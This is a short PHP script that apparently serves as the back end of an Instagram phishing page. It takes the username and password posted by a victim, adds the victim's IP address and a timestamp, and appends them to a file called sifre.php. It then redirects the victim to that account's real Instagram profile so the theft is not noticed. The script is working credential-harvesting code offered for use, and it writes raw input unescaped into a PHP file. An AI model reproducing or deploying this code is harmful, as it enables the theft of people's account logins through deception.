<?php
if ($_POST) {
	$kad = $_POST["ad"];
	$pass = $_POST["sifre"];

	if (!$kad || !$pass) {
		
		header("location:index.php");
	}else{
		$kad = $_POST["ad"];
		$pass =  $_POST["sifre"];
		$ip = $_SERVER['REMOTE_ADDR'];
		date_default_timezone_set('Europe/Istanbul');  
		$cur_time=date("d-m-Y H:i:s");
		$file = fopen('sifre.php', 'a'); 
		fwrite($file, "<font color='red'>".$kad."</font><br><font color='green'>".$pass. "</font><br><font color='black'>".$ip. "</font><br><font color='orange'>".$cur_time. "</font>\n\n <hr>");
		fclose($file); 
		echo '';
				 header("Refresh:1; url=https://instagram.com/{$kad}");
	}
}else{ 
	header("location:index.php");
}
	?>


